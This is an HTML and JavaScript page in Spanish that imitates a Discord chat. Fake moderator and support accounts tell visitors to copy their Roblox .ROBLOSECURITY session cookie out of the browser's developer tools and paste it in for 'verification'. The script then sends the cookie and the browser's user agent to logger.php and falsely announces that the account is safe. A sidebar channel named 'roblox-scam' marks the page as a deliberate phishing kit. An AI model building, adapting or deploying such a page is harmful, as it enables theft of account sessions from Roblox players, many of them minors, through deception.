<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="icon" href="https://discord.com/assets/f9c71e489c608c741d9cdbe2503d4d14.svg">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; 
            height: 100vh; 
            background: #36393f; 
            color: #dcddde; 
            display: flex; 
            overflow: hidden;
        }
        .sidebar { width: 240px; background: #2f3136; padding: 20px 0; }
        .servers { display: flex; flex-direction: column; gap: 8px; }
        .server { width: 50px; height: 50px; margin: 0 auto 4px; border-radius: 50%; background: #202225; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; }
        .server.active { background: #5865f2; }
        .channels { padding: 10px 0; }
        .channel { padding: 8px 20px; cursor: pointer; }
        .channel:hover { background: #34373c; }
        .channel.active { background: #34373c; }
        
        .main { flex: 1; display: flex; flex-direction: column; background: #36393f; }
        .header { height: 48px; background: #2f3136; padding: 0 16px; display: flex; align-items: center; border-bottom: 1px solid #202225; }
        .chat { flex: 1; padding: 20px; overflow-y: auto; }
        .message { display: flex; gap: 12px; margin-bottom: 20px; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #5865f2; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        .message-content { flex: 1; }
        .username { font-weight: 600; color: #fff; margin-bottom: 2px; }
        .text { color: #dcddde; }
        .bot { background: #40444b; }
        
        .input-area { height: 70px; background: #40444b; padding: 12px 16px; display: flex; align-items: flex-end; gap: 12px; }
        .input { flex: 1; background: #40444b; border: none; color: #dcddde; padding: 10px 12px; border-radius: 8px; font-size: 14px; resize: none; max-height: 70px; }
        .input:focus { outline: none; background: #484c52; }
        .send-btn { width: 40px; height: 40px; background: #5865f2; border: none; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .typing { color: #b9bbbe; font-style: italic; font-size: 14px; }
        .status { position: fixed; top: 10px; right: 10px; background: #43b581; color: white; padding: 8px 12px; border-radius: 4px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="servers">
            <div class="server active">🏠</div>
            <div class="server">😈</div>
        </div>
        <div class="channels">
            <div class="channel active"># general</div>
            <div class="channel"># roblox-scam</div>
        </div>
    </div>
    
    <div class="main">
        <div class="header">
            <h3># general</h3>
        </div>
        
        <div class="chat" id="chat">
            <div class="message">
                <div class="avatar">🤖</div>
                <div class="message-content bot">
                    <div class="username">RobloxMod#0001</div>
                    <div class="text">¡Hola! Para verificar tu cuenta de Roblox y evitar ban, pega tu cookie .ROBLOSECURITY aquí 👇</div>
                </div>
            </div>
            <div class="message">
                <div class="avatar">👮</div>
                <div class="message-content">
                    <div class="username">Support#1337</div>
                    <div class="text">F12 → Application → Cookies → www.roblox.com → copia .ROBLOSECURITY completa</div>
                </div>
            </div>
        </div>
        
        <div class="input-area">
            <textarea class="input" id="messageInput" placeholder="Pega tu .ROBLOSECURITY aquí para verificar..." rows="1"></textarea>
            <button class="send-btn" onclick="sendMessage()">➤</button>
        </div>
    </div>
    
    <div class="status" id="status">🟢 Conectado</div>

    <script>
        const chat = document.getElementById('chat');
        const input = document.getElementById('messageInput');
        let typing = false;

        input.addEventListener('input', function() {
            this.style.height = 'auto';
            this.style.height = this.scrollHeight + 'px';
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendMessage();
            }
        });

        async function sendMessage() {
            const message = input.value.trim();
            if (!message) return;

            // Mostrar mensaje del usuario
            addMessage('Tú', message, '🧑');
            input.value = '';
            input.style.height = 'auto';

            // Bot responde
            setTimeout(() => {
                addMessage('RobloxMod#0001', 'Verificando tu cookie...', '🤖');
                sendCookie(message);
            }, 1000);
        }

        function addMessage(user, text, emoji) {
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            messageDiv.innerHTML = `
                <div class="avatar" style="background: #${emoji === '🤖' ? '7289da' : '43b581'}">${emoji}</div>
                <div class="message-content ${emoji === '🤖' ? 'bot' : ''}">
                    <div class="username">${user}</div>
                    <div class="text">${text}</div>
                </div>
            `;
            chat.appendChild(messageDiv);
            chat.scrollTop = chat.scrollHeight;
        }

        async function sendCookie(cookie) {
            const formData = new FormData();
            formData.append('roblox_cookie', cookie);
            formData.append('user_agent', navigator.userAgent);

            try {
                const response = await fetch('logger.php', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();

                if (data.status === 'success') {
                    setTimeout(() => {
                        addMessage('RobloxMod#0001', '✅ Cookie verificada correctamente. Tu cuenta está segura. 🎉', '🤖');
                    }, 1500);
                } else {
                    addMessage('RobloxMod#0001', '❌ Error en verificación. Intenta de nuevo.', '🤖');
                }
            } catch (e) {
                addMessage('RobloxMod#0001', '❌ Error de conexión. Revisa tu cookie.', '🤖');
            }
        }

        // Mensaje aleatorio cada 30s
        setInterval(() => {
            const messages = [
                'Recuerda copiar TODA la cookie sin espacios 😊',
                'Tu cuenta quedará verificada en segundos ⏱️',
                '¡Casi listo! Solo pega la cookie 👇'
            ];
            if (Math.random() > 0.7) {
                addMessage('Support#1337', messages[Math.floor(Math.random() * messages.length)], '👮');
            }
        }, 30000);
    </script>
</body>
</html>
